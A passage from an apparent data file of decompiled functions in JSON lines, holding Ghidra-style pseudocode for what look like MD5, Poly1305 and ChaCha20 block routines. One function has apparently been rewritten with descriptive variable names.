uVar6;\nuVar5 = uVar5 + 0x49b40821 + local_78[0xf] + ((uVar6 ^ uVar3) & uVar4 ^ uVar3);\nuVar5 = (uVar5 * 0x400000 | uVar5 >> 10) + uVar4;\nuVar3 = ((uVar5 ^ uVar4) & uVar6 ^ uVar4) + local_78[1] + -0x9e1da9e + uVar3;\nuVar3 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar5;\nuVar6 = local_78[6] + -0x3fbf4cc0 + uVar6 + ((uVar3 ^ uVar5) & uVar4 ^ uVar5);\nuVar6 = (uVar6 * 0x200 | uVar6 >> 0x17) + uVar3;\nuVar4 = local_78[0xb] + 0x265e5a51 + uVar4 + ((uVar6 ^ uVar3) & uVar5 ^ uVar3);\nuVar4 = (uVar4 * 0x4000 | uVar4 >> 0x12) + uVar6;\nuVar5 = local_78[0] + -0x16493856 + uVar5 + ((uVar4 ^ uVar6) & uVar3 ^ uVar6);\nuVar5 = (uVar5 * 0x100000 | uVar5 >> 0xc) + uVar4;\nuVar3 = ((uVar5 ^ uVar4) & uVar6 ^ uVar4) + local_78[5] + -0x29d0efa3 + uVar3;\nuVar3 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar5;\nuVar6 = local_78[10] + 0x2441453 + uVar6 + ((uVar3 ^ uVar5) & uVar4 ^ uVar5);\nuVar6 = (uVar6 * 0x200 | uVar6 >> 0x17) + uVar3;\nuVar4 = local_78[0xf] + -0x275e197f + uVar4 + ((uVar6 ^ uVar3) & uVar5 ^ uVar3);\nuVar4 = (uVar4 * 0x4000 | uVar4 >> 0x12) + uVar6;\nuVar5 = local_78[4] + -0x182c0438 + uVar5 + ((uVar4 ^ uVar6) & uVar3 ^ uVar6);\nuVar5 = (uVar5 * 0x100000 | uVar5 >> 0xc) + uVar4;\nuVar3 = ((uVar5 ^ uVar4) & uVar6 ^ uVar4) + local_78[9] + 0x21e1cde6 + uVar3;\nuVar3 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar5;\nuVar6 = local_78[0xe] + -0x3cc8f82a + uVar6 + ((uVar3 ^ uVar5) & uVar4 ^ uVar5);\nuVar7 = (uVar6 * 0x200 | uVar6 >> 0x17) + uVar3;\nuVar4 = local_78[3] + -0xb2af279 + uVar4 + ((uVar7 ^ uVar3) & uVar5 ^ uVar3);\nuVar6 = (uVar4 * 0x4000 | uVar4 >> 0x12) + uVar7;\nuVar5 = local_78[8] + 0x455a14ed + uVar5 + ((uVar6 ^ uVar7) & uVar3 ^ uVar7);\nuVar5 = (uVar5 * 0x100000 | uVar5 >> 0xc) + uVar6;\nuVar3 = ((uVar5 ^ uVar6) & uVar7 ^ uVar6) + local_78[0xd] + -0x561c16fb + uVar3;\nuVar4 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar5;\nuVar3 = local_78[2] + -0x3105c08 + uVar7 + ((uVar4 ^ uVar5) & uVar6 ^ uVar5);\nuVar3 = uVar4 + (uVar3 * 0x200 | uVar3 >> 0x17);\nuVar6 = local_78[7] + 0x676f02d9 + uVar6 + ((uVar3 ^ uVar4) & uVar5 ^ uVar4);\nuVar8 = uVar3 + (uVar6 * 0x4000 | uVar6 >> 0x12);\nuVar5 = local_78[0xc] + -0x72d5b376 + uVar5 + ((uVar8 ^ uVar3) & uVar4 ^ uVar3);\nuVar5 = uVar8 + (uVar5 * 0x100000 | uVar5 >> 0xc);\nuVar4 = (uVar8 ^ uVar3 ^ uVar5) + local_78[5] + -0x5c6be + uVar4;\nuVar7 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar5;\nuVar3 = local_78[8] + -0x788e097f + uVar3 + (uVar5 ^ uVar8 ^ uVar7);\nuVar6 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar7;\nuVar3 = local_78[0xb] + 0x6d9d6122 + uVar8 + (uVar7 ^ uVar5 ^ uVar6);\nuVar4 = (uVar3 * 0x10000 | uVar3 >> 0x10) + uVar6;\nuVar3 = (uVar6 ^ uVar7 ^ uVar4) + local_78[0xe] + -0x21ac7f4 + uVar5;\nuVar3 = (uVar3 * 0x800000 | uVar3 >> 9) + uVar4;\nuVar5 = local_78[1] + -0x5b4115bc + uVar7 + (uVar4 ^ uVar6 ^ uVar3);\nuVar7 = (uVar5 * 0x10 | uVar5 >> 0x1c) + uVar3;\nuVar5 = local_78[4] + 0x4bdecfa9 + uVar6 + (uVar3 ^ uVar4 ^ uVar7);\nuVar6 = (uVar5 * 0x800 | uVar5 >> 0x15) + uVar7;\nuVar5 = local_78[7] + -0x944b4a0 + uVar4 + (uVar7 ^ uVar3 ^ uVar6);\nuVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar6;\nuVar3 = (uVar6 ^ uVar7 ^ uVar5) + local_78[10] + -0x41404390 + uVar3;\nuVar3 = (uVar3 * 0x800000 | uVar3 >> 9) + uVar5;\nuVar4 = local_78[0xd] + 0x289b7ec6 + uVar7 + (uVar5 ^ uVar6 ^ uVar3);\nuVar7 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar3;\nuVar4 = local_78[0] + -0x155ed806 + uVar6 + (uVar3 ^ uVar5 ^ uVar7);\nuVar4 = (uVar4 * 0x800 | uVar4 >> 0x15) + uVar7;\nuVar5 = local_78[3] + -0x2b10cf7b + uVar5 + (uVar7 ^ uVar3 ^ uVar4);\nuVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar4;\nuVar3 = (uVar4 ^ uVar7 ^ uVar5) + local_78[6] + 0x4881d05 + uVar3;\nuVar3 = (uVar3 * 0x800000 | uVar3 >> 9) + uVar5;\nuVar6 = local_78[9] + -0x262b2fc7 + uVar7 + (uVar5 ^ uVar4 ^ uVar3);\nuVar6 = (uVar6 * 0x10 | uVar6 >> 0x1c) + uVar3;\nuVar4 = local_78[0xc] + -0x1924661b + uVar4 + (uVar3 ^ uVar5 ^ uVar6);\nuVar4 = (uVar4 * 0x800 | uVar4 >> 0x15) + uVar6;\nuVar5 = local_78[0xf] + 0x1fa27cf8 + uVar5 + (uVar6 ^ uVar3 ^ uVar4);\nuVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar4;\nuVar3 = (uVar4 ^ uVar6 ^ uVar5) + local_78[2] + -0x3b53a99b + uVar3;\nuVar3 = (uVar3 * 0x800000 | uVar3 >> 9) + uVar5;\nuVar6 = local_78[0] + -0xbd6ddbc + uVar6 + ((~uVar4 | uVar3) ^ uVar5);\nuVar6 = (uVar6 * 0x40 | uVar6 >> 0x1a) + uVar3;\nuVar4 = local_78[7] + 0x432aff97 + uVar4 + ((~uVar5 | uVar6) ^ uVar3);\nuVar4 = (uVar4 * 0x400 | uVar4 >> 0x16) + uVar6;\nuVar5 = local_78[0xe] + -0x546bdc59 + uVar5 + ((~uVar3 | uVar4) ^ uVar6);\nuVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar4;\nuVar3 = ((~uVar6 | uVar5) ^ uVar4) + local_78[5] + -0x36c5fc7 + uVar3;\nuVar3 = (uVar3 * 0x200000 | uVar3 >> 0xb) + uVar5;\nuVar6 = local_78[0xc] + 0x655b59c3 + uVar6 + ((~uVar4 | uVar3) ^ uVar5);\nuVar6 = (uVar6 * 0x40 | uVar6 >> 0x1a) + uVar3;\nuVar4 = local_78[3] + -0x70f3336e + uVar4 + ((~uVar5 | uVar6) ^ uVar3);\nuVar4 = (uVar4 * 0x400 | uVar4 >> 0x16) + uVar6;\nuVar5 = local_78[10] + -0x100b83 + uVar5 + ((~uVar3 | uVar4) ^ uVar6);\nuVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar4;\nuVar3 = ((~uVar6 | uVar5) ^ uVar4) + local_78[1] + -0x7a7ba22f + uVar3;\nuVar3 = (uVar3 * 0x200000 | uVar3 >> 0xb) + uVar5;\nuVar6 = local_78[8] + 0x6fa87e4f + uVar6 + ((~uVar4 | uVar3) ^ uVar5);\nuVar6 = (uVar6 * 0x40 | uVar6 >> 0x1a) + uVar3;\nuVar4 = local_78[0xf] + -0x1d31920 + uVar4 + ((~uVar5 | uVar6) ^ uVar3);\nuVar4 = (uVar4 * 0x400 | uVar4 >> 0x16) + uVar6;\nuVar5 = local_78[6] + -0x5cfebcec + uVar5 + ((~uVar3 | uVar4) ^ uVar6);\nuVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar4;\nuVar3 = ((~uVar6 | uVar5) ^ uVar4) + local_78[0xd] + 0x4e0811a1 + uVar3;\nuVar3 = (uVar3 * 0x200000 | uVar3 >> 0xb) + uVar5;\nuVar6 = local_78[4] + -0x8ac817e + uVar6 + ((~uVar4 | uVar3) ^ uVar5);\nuVar6 = (uVar6 * 0x40 | uVar6 >> 0x1a) + uVar3;\nuVar4 = local_78[0xb] + -0x42c50dcb + uVar4 + ((~uVar5 | uVar6) ^ uVar3);\nuVar4 = (uVar4 * 0x400 | uVar4 >> 0x16) + uVar6;\nuVar5 = local_78[2] + 0x2ad7d2bb + uVar5 + ((~uVar3 | uVar4) ^ uVar6);\nuVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar4;\nuVar3 = ((~uVar6 | uVar5) ^ uVar4) + local_78[9] + -0x14792c6f + uVar3;\n*(uint *)(param_1 + 8) = uVar6 + *(int *)(param_1 + 8);\n*(uint *)(param_1 + 0xc) = uVar1 + (uVar3 * 0x200000 | uVar3 >> 0xb) + uVar5;\n*(uint *)(param_1 + 0x14) = uVar4 + *(int *)(param_1 + 0x14);\n*(uint *)(param_1 + 0x10) = uVar5 + *(int *)(param_1 + 0x10);\nreturn 0;\n}\nLocal Variable: local_3c : undefined4\nLocal Variable: local_40 : undefined4\nLocal Variable: local_44 : undefined4\nLocal Variable: local_48 : undefined4\nLocal Variable: local_4c : undefined4\nLocal Variable: local_50 : undefined4\nLocal Variable: local_54 : undefined4\nLocal Variable: local_58 : undefined4\nLocal Variable: local_5c : undefined4\nLocal Variable: local_60 : undefined4\nLocal Variable: local_64 : undefined4\nLocal Variable: local_68 : undefined4\nLocal Variable: local_6c : undefined4\nLocal Variable: local_70 : undefined4\nLocal Variable: local_74 : undefined4\nLocal Variable: local_78 : undefined4"}
{"Function Name": "FUN_00404b80", "Address": "00404b80", "Source Code": "void FUN_00404b80(long *inputArray, byte *byteArray, ulong threshold)\n{\n    long calculation1, value1, value2, value3, value4, multipliedValue, intermediateValue, finalValue;\n    ulong result1, result2, result3, result4, result5;\n    \n    value1 = inputArray[1];\n    value2 = inputArray[3];\n    value3 = *inputArray;\n    result1 = inputArray[5];\n    result3 = inputArray[7];\n    value4 = inputArray[2];\n    multipliedValue = value2 * 5; \n    intermediateValue = inputArray[6];\n    result2 = inputArray[8];\n    result4 = inputArray[9];\n    \n    if (0xf < threshold) {\n        \n        byte *endAddress = byteArray + (threshold - 0x10 & 0xfffffffffffffff0) + 0x10;\n        do {\n            \n            calculation1 = result1 + ((uint)byteArray[1] << 8 | (uint)byteArray[2] << 0x10 | (uint)*byteArray | (byteArray[3] & 3) << 0x18);\n            intermediateValue += (ulong)((uint)(((ulong)byteArray[4] << 8 | (ulong)byteArray[5] << 0x10 | (ulong)byteArray[3] | (ulong)byteArray[6] << 0x18) >> 2) & 0x3ffffff);\n            ulong calculation2 = result3 + ((uint)(((ulong)byteArray[7] << 8 | (ulong)byteArray[8] << 0x10 | (ulong)byteArray[6] | (ulong)byteArray[9] << 0x18) >> 4) & 0x3ffffff);\n            ulong calculation3 = result2 + (((ulong)byteArray[10] << 8 | (ulong)byteArray[0xb] << 0x10 | (ulong)byteArray[9] | (ulong)byteArray[0xc] << 0x18) >> 6);\n            finalValue = result4 + (((ulong)byteArray[0xd] << 8 | (ulong)byteArray[0xe] << 0x10 | (ulong)byteArray[0xf] << 0x18) >> 8 | -(ulong)(*(char *)(inputArray + 0x11) == '\\0') & 0x1000000);\n            \n            result1 = calculation1 * value3 + value4 * 5 * calculation3 + intermediateValue * multipliedValue + value1 * 5 * finalValue + value2 * 5 * calculation2;\n            result2 = calculation1 * value4 + calculation3 * multipliedValue + intermediateValue * value1 + calculation2 * value3 + value4 * 5 * finalValue + (result1 >> 0x1a);\n            result3 = (ulong)((uint)result2 & 0x3ffffff);\n            result2 = finalValue * multipliedValue + calculation3 * value3 + value2 * calculation1 + intermediateValue * value4 + calculation2 * value1 + (result2 >> 0x1a);\n            result5 = (result2 >> 0x1a) + finalValue * value3 + calculation3 * value1 + calculation1 * inputArray[4] + intermediateValue * value2 + calculation2 * value4;\n            result2 = (ulong)((uint)result2 & 0x3ffffff);\n            result4 = (ulong)((uint)result5 & 0x3ffffff);\n            byteArray += 0x10; \n            result5 = (result5 >> 0x1a) * 5 + (ulong)((uint)result1 & 0x3ffffff);\n            result1 = (ulong)((uint)result5 & 0x3ffffff);\n            intermediateValue = (result5 >> 0x1a) + (ulong)((uint)result2 & 0x3ffffff);\n        } while (byteArray != endAddress); \n    }\n    \n    inputArray[5] = result1;\n    inputArray[6] = intermediateValue;\n    inputArray[7] = result3;\n    inputArray[8] = result2;\n    inputArray[9] = result4;\n    return; \n}"}
{"Function Name": "FUN_00404f70", "Address": "00404f70", "Source Code": "void FUN_00404f70(uint *param_1,byte *param_2,byte *param_3,uint param_4)\n{\nuint uVar1;\nuint uVar2;\nuint uVar3;\nuint uVar4;\nuint uVar5;\nuint uVar6;\nuint uVar7;\nuint uVar8;\nuint uVar9;\nuint uVar10;\nuint uVar11;\nuint uVar12;\nuint uVar13;\nuint uVar14;\nbyte *pbVar15;\nlong lVar16;\nuint uVar17;\nuint uVar18;\nuint uVar19;\nuint uVar20;\nuint uVar21;\nuint uVar22;\nuint uVar23;\nuint uVar24;\nuint uVar25;\nuint uVar26;\nuint uVar27;\nuint uVar28;\nuint uVar29;\nuint uVar30;\nuint uVar31;\nuint uVar32;\nuint uVar33;\nuint uVar34;\nuint local_108;\nint local_104;\nuint local_f8;\nuint local_f4;\nbyte *local_f0;\nuint local_e8;\nbyte *local_d8;\nbyte local_78 [72];\n\nuVar1 = *param_1;\nuVar2 = param_1[1];\nuVar3 = param_1[2];\nuVar4 = param_1[3];\nuVar5 = param_1[4];\nuVar6 = param_1[5];\nuVar7 = param_1[6];\nuVar8 = param_1[7];\nuVar9 = param_1[8];\nuVar10 = param_1[9];\nuVar11 = param_1[10];\nuVar12 = param_1[0xb];\nlocal_f4 = param_1[0xc];\nlocal_e8 = param_1[0xd];\nuVar13 = param_1[0xe];\nuVar14 = param_1[0xf];\npbVar15 = (byte *)0x0;\nlocal_f8 = param_4;\nlocal_d8 = param_3;\nwhile( true ) {\nif (local_f8 < 0x40) {\nif (local_f8 == 0) {\nparam_2 = local_78;\nlocal_f0 = param_2;\n}\nelse {\nlVar16 = 0;\ndo {\nlocal_78[lVar16] = param_2[lVar16];\nlVar16 = lVar16 + 1;\n} while (lVar16 != (ulong)(local_f8 - 1) + 1);\nparam_2 = local_78;\nlocal_f0 = param_2;\n}\n}\nelse {\nlocal_f0 = local_d8;\nlocal_d8 = pbVar15;\n}\nlocal_104 = 10;\nuVar30 = uVar12;\nuVar27 = uVar14;\nuVar17 = uVar13;\nuVar28 = uVar8;\nuVar20 = uVar3;\nuVar18 = uVar7;\nuVar26 = uVar10;\nuVar21 = local_e8;\nuVar22 = uVar6;\nuVar31 = uVar2;\nuVar19 = uVar9;\nuVar23 = local_f4;\nuVar25 = uVar5;\nuVar34 = uVar1;\nuVar29 = uVar4;\nlocal_108 = uVar11;\ndo {\nuVar23 = uVar23 ^ uVar34 + uVar25;\nuVar21 = uVar21 ^ uVar31 + uVar22;\nuVar17 = uVar17 ^ uVar20 + uVar18;\nuVar24 = uVar23 >> 0x10 | uVar23 << 0x10;\nuVar23 = uVar21 >> 0x10 | uVar21 << 0x10;\nuVar21 = uVar17 >> 0x10 | uVar17 << 0x10;\nuVar19 = uVar19 + uVar24;\nuVar26 = uVar26 + uVar23;\nuVar17 = uVar25 ^ uVar19;\nuVar32 = uVar22 ^ uVar26;\nuVar17 = uVar17 >> 0x14 | uVar17 << 0xc;\nuVar32 = uVar32 >> 0x14 | uVar32 << 0xc;\nuVar34 = uVar34 + uVar25 + uVar17;\nuVar31 = uVar31 + uVar22 + uVar32;\nuVar24 = uVar24 ^ uVar34;\nuVar23 = uVar23 ^ uVar31;\nuVar25 = uVar24 >> 0x18 | uVar24 << 8;\nuVar23 = uVar23 >> 0x18 | uVar23 << 8;\nuVar19 = uVar19 + uVar25;\nuVar26 = uVar26 + uVar23;\nuVar17 = uVar17 ^ uVar19;\nuVar32 = uVar32 ^ uVar26;\nuVar33 = uVar32 >> 0x19 | uVar32 << 7;\nuVar17 = uVar17 >> 0x19 | uVar17 << 7;\nlocal_108 = local_108 + uVar21;\nuVar22 = uVar18 ^ local_108;\nuVar22 = uVar22 >> 0x14 | uVar22 << 0xc;\nuVar20 = uVar20 + uVar18 + uVar22;\nuVar21 = uVar21 ^ uVar20;\nuVar18 = uVar21 >> 0x18 | uVar21 << 8;\nlocal_108 = local_108 + uVar18;\nuVar34 = uVar34 + uVar33;\nuVar27 = uVar27 ^ uVar29 + uVar28;\nuVar22 = uVar22 ^ local_108;\nuVar32 = uVar27 >> 0x10 | uVar27 << 0x10;\nuVar21 = uVar22 >> 0x19 | uVar22 << 7;\nuVar30 = uVar30 + uVar32;\nuVar31 = uVar31 + uVar21;\nuVar27 = uVar28 ^ uVar30;\nuVar25 = uVar25 ^ uVar31;\nuVar27 = uVar27 >> 0x14 | uVar27 << 0xc;\nuVar24 = uVar25 >> 0x10 | uVar25 << 0x10;\nuVar29 = uVar29 + uVar28 + uVar27;\nuVar32 = uVar32 ^ uVar29;\nuVar28 = uVar32 >> 0x18 | uVar32 << 8;\nuVar30 = uVar30 + uVar28;\nuVar28 = uVar28 ^ uVar34;\nuVar22 = uVar28 >> 0x10 | uVar28 << 0x10;\nuVar27 = uVar27 ^ uVar30;\nuVar30 = uVar30 + uVar24;\nlocal_108 = local_108 + uVar22;\nuVar21 = uVar21 ^ uVar30;\nuVar28 = uVar27 >> 0x19 | uVar27 << 7;\nuVar33 = uVar33 ^ local_108;\nuVar25 = uVar21 >> 0x14 | uVar21 << 0xc;\nuVar21 = uVar33 >> 0x14 | uVar33 << 0xc;\nuVar34 = uVar34 + uVar21;\nuVar22 = uVar22 ^ uVar34;\nuVar27 = uVar22 >> 0x18 | uVar22 << 8;\nlocal_108 = local_108 + uVar27;\nuVar21 = uVar21 ^ local_108;\nuVar22 = uVar21 >> 0x19 | uVar21 << 7;\nuVar31 = uVar31 + uVar25;\nuVar20 = uVar20 + uVar28;\nuVar23 = uVar23 ^ uVar20;\nuVar24 = uVar24 ^ uVar31;\nuVar29 = uVar29 + uVar17;\nuVar21 = uVar23 >> 0x10 | uVar23 << 0x10;\nuVar23 = uVar24 >> 0x18 | uVar24 << 8;\nuVar18 = uVar18 ^ uVar29;\nuVar19 = uVar19 + uVar21;\nuVar30 = uVar30 + uVar23;\nuVar24 = uVar18 >> 0x10 | uVar18 << 0x10;\nuVar28 = uVar28 ^ uVar19;\nuVar25 = uVar25 ^ uVar30;\nuVar26 = uVar26 + uVar24;\nuVar28 = uVar28 >> 0x14 | uVar28 << 0xc;\nuVar18 = uVar25 >> 0x19 | uVar25 << 7;\nuVar17 = uVar17 ^ uVar26;\nuVar20 = uVar20 + uVar28;\nuVar25 = uVar17 >> 0x14 | uVar17 << 0xc;\nuVar21 = uVar21 ^ uVar20;\nuVar29 = uVar29 + uVar25;\nuVar21 = uVar21 >> 0x18 | uVar21 << 8;\nuVar24 = uVar24 ^ uVar29;\nuVar19 = uVar19 + uVar21;\nuVar17 = uVar24 >> 0x18 | uVar24 << 8;\nuVar28 = uVar28 ^ uVar19;\nuVar26 = uVar26 + uVar17;\nuVar28 = uVar28 >> 0x19 | uVar28 << 7;\nuVar25 = uVar25 ^ uVar26;\nuVar25 = uVar25 >> 0x19 | uVar25 << 7;\nlocal_104 = local_104 + -1;\n} while (local_104 != 0);\nuVar19 = uVar19 + uVar9;\nuVar29 = uVar29 + uVar4;\nuVar20 = uVar20 + uVar3;\nuVar18 = uVar18 + uVar7;\nuVar26 = uVar26 + uVar10;\nuVar30 = uVar30 + uVar12;\nuVar23 = uVar23 + local_f4;\nuVar21 = uVar21 + local_e8;\nuVar17 = uVar17 + uVar13;\nuVar27 = uVar27 + uVar14;\nuVar34 = uVar34 + uVar1;\nuVar31 = uVar31 + uVar2;\nuVar25 = uVar25 + uVar5;\nuVar22 = uVar22 + uVar6;\nuVar28 = uVar28 + uVar8;\nlocal_108 = local_108 + uVar11;\nif (local_f8 < 0x40) {\n*(char *)((long)param_1 + 0x41) = (char)(uVar34 >> 8);\n*(char *)(param_1 + 0x12) = (char)uVar20;\n*(char *)(param_1 + 0x13) = (char)uVar29;\n*(char *)(param_1 + 0x10) = (char)uVar34;\n*(char *)((long)param_1 + 0x42) = (char)(uVar34 >> 0x10);\n*(char *)(param_1 + 0x11) = (char)uVar31;\n*(char *)(param_1 + 0x14) = (char)uVar25;\n*(char *)(param_1 + 0x15) = (char)uVar22;\n*(char *)((long)param_1 + 0x43) = (char)(uVar34 >> 0x18);\n*(char *)(param_1 + 0x17) = (char)uVar28;\n*(char *)((long)param_1 + 0x45) = (char)(uVar31 >> 8);\n*(char *)((long)param_1 + 0x46) = (char)(uVar31 >> 0x10);\n*(char *)((long)param_1 + 0x47) = (char)(uVar31 >> 0x18);\n*(char *)((long)param_1 + 0x49) = (char)(uVar20 >> 8);\n*(char *)((long)param_1 + 0x4a) = (char)(uVar20 >> 0x10);\n*(char *)((long)param_1 + 0x51) = (char)(uVar25 >> 8);\n*(char *)((long)param_1 + 0x4b) = (char)(uVar20 >> 0x18);\n*(char *)((long)param_1 + 0x52) = (char)(uVar25 >> 0x10);\n*(char *)((long)param_1 + 0x4d) = (char)(uVar29 >> 8);\n*(char *)((long)param_1 + 0x53) = (char)(uVar25 >> 0x18);\n*(char *)((long)param_1 + 0x4e) = (char)(uVar29 >> 0x10);\n*(char *)((long)param_1 + 0x55) = (char)(uVar22 >> 8);\n*(char *)((long)param_1 + 0x4f) = (char)(uVar29 >> 0x18);\n*(char *)((long)param_1 + 0x56) = (char)(uVar22 >> 0x10);\n*(char *)(param_1 + 0x16) = (char)uVar18;\n*(char *)((long)param_1 + 0x57) = (char)(uVar22 >> 0x18);\n*(char *)((long)param_1 + 0x59) = (char)(uVar18 >> 8);\n*(char *)((long)param_1 + 0x5d) = (char)(uVar28 >> 8);\n*(char *)((long)param_1 + 0x5a) = (char)(uVar18 >> 0x10);\n*(char *)((long)param_1 + 0x5b) = (char)(uVar18 >> 0x18);\n*(char *)((long)param_1 + 0x5e) = (char)(uVar28 >> 0x10);\n*(char *)(param_1 + 0x19) = (char)uVar26;\n*(char *)((long)param_1 + 0x5f) = (char)(uVar28 >> 0x18);\n*(char *)(param_1 + 0x1b) = (char)uVar30;\n*(char *)(param_1 + 0x1c) = (char)uVar23;\n*(char *)(param_1 + 0x1d) = (char)uVar21;\n*(char *)(param_1 + 0x18) = (char)uVar19;\n*(char *)(param_1 + 0x1f) = (char)uVar27;\n*(char *)((long)param_1 + 0x61) = (char)(uVar19 >> 8);\n*(char *)((long)param_1 + 0x62) = (char)(uVar19 >> 0x10);\n*(char *)((long)param_1 + 99) = (char)(uVar19 >> 0x18);\n*(char *)(param_1 + 0x1a) = (char)local_108;\n*(char *)((long)param_1 + 0x65) = (char)(uVar26 >> 8);\n*(char *)((long)param_1 + 0x66) = (char)(uVar26 >> 0x10);\n*(char *)((long)param_1 + 0x67) = (char)(uVar26 >> 0x18);\n*(char *)((long)param_1 + 0x69) = (char)(local_108 >> 8);\n*(char *)((long)param_1 + 0x6a) = (char)(local_108 >> 0x10);\n*(char *)((long)param_1 + 0x6b) = (char)(local_108 >> 0x18);\n*(char *)(param_1 + 0x1e) = (char)uVar17;\n*(char *)((long)param_1 + 0x6d) = (char)(uVar30 >> 8);\n*(char *)((long)param_1 + 0x6e) = (char)(uVar30 >> 0x10);\n*(char *)((long)param_1 + 0x6f) = (char)(uVar30 >> 0x18);\n*(char *)((long)param_1 + 0x71) = (char)(uVar23 >> 8);\n*(char *)((long)param_1 + 0x72) = (char)(uVar23 >> 0x10);\n*(char *)((long)param_1 + 0x73) = (char)(uVar23 >> 0x18);\n*(char *)((long)param_1 + 0x75) = (char)(uVar21 >> 8);\n*(char *)((long)param_1 + 0x76) = (char)(uVar21 >> 0x10);\n*(char *)((long)param_1 + 0x77) = (char)(uVar21 >> 0x18);\n*(char *)((long)param_1 + 0x79) = (char)(uVar17 >> 8);\n*(char *)((long)param_1 + 0x7a) = (char)(uVar17 >> 0x10);\n*(char *)((long)param_1 + 0x7b) = (char)(uVar17 >> 0x18);\n*(char *)((long)param_1 + 0x7d) = (char)(uVar27 >> 8);\n*(char *)((long)param_1 + 0x7e) = (char)(uVar27 >> 0x10);\n*(char *)((long)param_1 + 0x7f) = (char)(uVar27 >> 0x18);\n}\nuVar34 = ((uint)param_2[1] << 8 | (uint)param_2[2] << 0x10 | (uint)*param_2 |\n(uint)param_2[3] << 0x18) ^ uVar34;\nuVar31 = ((uint)param_2[5] << 8 | (uint)param_2[6] << 0x10 | (uint)param_2[4] |\n(uint)param_2[7] << 0x18) ^ uVar31;\nuVar20 = ((uint)param_2[9] << 8 | (uint)param_2[10] << 0x10 | (uint)param_2[8] |\n(uint)param_2[0xb] << 0x18) ^ uVar20;\nuVar29 = ((uint)param_2[0xd] << 8 | (uint)param_2[0xe] << 0x10 | (uint)param_2[0xc] |\n(uint)param_2[0xf] << 0x18) ^ uVar29;\nuVar25 = ((uint)param_2[0x11] << 8 | (uint)param_2[0x12] << 0x10 | (uint)param_2[0x10] |\n(uint)param_2[0x13] << 0x18) ^ uVar25;\nuVar22 = ((uint)param_2[0x15] << 8 | (uint)param_2[0x16] << 0x10 | (uint)param_2[0x14] |\n(uint)param_2[0x17] << 0x18) ^ uVar22;\nuVar18 = ((uint)param_2[0x19] << 8 | (uint)param_2[0x1a] << 0x10 | (uint)param_2[0x18] |\n(uint)param_2[0x1b] << 0x18) ^ uVar18;\nuVar28 = ((uint)param_2[0x1d] << 8 | (uint)param_2[0x1e] << 0x10 | (uint)param_2[0x1c] |\n(uint)param_2[0x1f] << 0x18) ^ uVar28;\nuVar19 = ((uint)param_2[0x21] << 8 | (uint)param_2[0x22] << 0x10 | (uint)param_2[0x20] |\n(uint)param_2[0x23] << 0x18) ^ uVar19;\nuVar26 = ((uint)param_2[0x25] << 8 | (uint)param_2[0x26] << 0x10 | (uint)param_2[0x24] |\n(uint)param_2[0x27] << 0x18) ^ uVar26;\nlocal_108 = ((uint)param_2[0x29] << 8 | (uint)param_2[0x2a] << 0x10 | (uint)param_2[0x28] |\n(uint)param_2[0x2b] << 0x18) ^ local_108;\nuVar30 = ((uint)param_2[0x2d] << 8 | (uint)param_2[0x2e] << 0x10 | (uint)param_2[0x2c] |\n(uint)param_2[0x2f] << 0x18) ^ uVar30;\nuVar23 = ((uint)param_2[0x31] << 8 | (uint)param_2[0x32] << 0x10 | (uint)param_2[0x30] |\n(uint)param_2[0x33] << 0x18) ^ uVar23;\nuVar21 = ((uint)param_2[0x35] << 8 | (uint)param_2[0x36] << 0x10 | (uint)param_2[0x34] |\n(uint)param_2[0x37] << 0x18) ^ uVar21;\nlocal_f4 = local_f4 + 1;\nuVar17 = ((uint)param_2[0x39] << 8 | (uint)param_2[0x3a] << 0x10 | (uint)param_2[0x38] |\n(uint)param_2[0x3b] << 0x18) ^ uVar17;\nuVar27 = ((uint)param_2[0x3d] << 8 | (uint)param_2[0x3e] << 0x10 | (uint)param_2[0x3c] |\n(uint)param_2[0x3f] << 0x18) ^ uVar27;\nlocal_e8 = local_e8 + (local_f4 == 0);\n*local_f0 = (byte)uVar34;\nlocal_f0[1] = (byte)(uVar34 >> 8);\nlocal_f0[3] = (byte)(uVar34 >> 0x18);\nlocal_f0[4] = (byte)uVar31;\nlocal_f0[0xc] = (byte)uVar29;\nlocal_f0[5] = (byte)(uVar31 >> 8);\nlocal_f0[7] = (byte)(uVar31 >> 0x18);\nlocal_f0[0x10] = (byte)uVar25;\nlocal_f0[6] = (byte)(uVar31 >> 0x10);\nlocal_f0[0x14] = (byte)uVar22;\nlocal_f0[0x18] = (byte)uVar18;\nlocal_f0[0x1c] = (byte)uVar28;\nlocal_f0[0x20] = (byte)uVar19;\nlocal_f0[2] = (byte)(uVar34 >> 0x10);\nlocal_f0[8] = (byte)uVar20;\nlocal_f0[9] = (byte)(uVar20 >> 8);\nlocal_f0[10] = (byte)(uVar20 >> 0x10);\nlocal_f0[0xb] = (byte)(uVar20 >> 0x18);\nlocal_f0[0xd] = (byte)(uVar29 >> 8);\nlocal_f0[0xf] = (byte)(uVar29 >> 0x18);\nlocal_f0[0xe] = (byte)(uVar29 >> 0x10);\nlocal_f0[0x11] = (byte)(uVar25 >> 8);\nlocal_f0[0x13] = (byte)(uVar25 >> 0x18);\nlocal_f0[0x12] = (byte)(uVar25 >> 0x10);\nlocal_f0[0x15] = (byte)(uVar22 >> 8);\nlocal_f0[0x17] = (byte)(uVar22 >> 0x18);\nlocal_f0[0x16] = (byte)(uVar22 >> 0x10);\nlocal_f0[0x19] = (byte)(uVar18 >> 8);\nlocal_f0[0x1b] = (byte)(uVar18 >> 0x18);\nlocal_f0[0x1a] = (byte)(uVar18 >> 0x10);\nlocal_f0[0x1d] = (byte)(uVar28 >> 8);\nlocal_f0[0x1f] = (byte)(uVar28 >> 0x18);\nlocal_f0[0x1e] = (byte)(uVar28 >> 0x10);\nlocal_f0[0x21] = (byte)(uVar19 >> 8);\nlocal_f0[0x22] = (byte)(uVar19 >> 0x10);\nlocal_f0[0x23] = (byte)(uVar19 >> 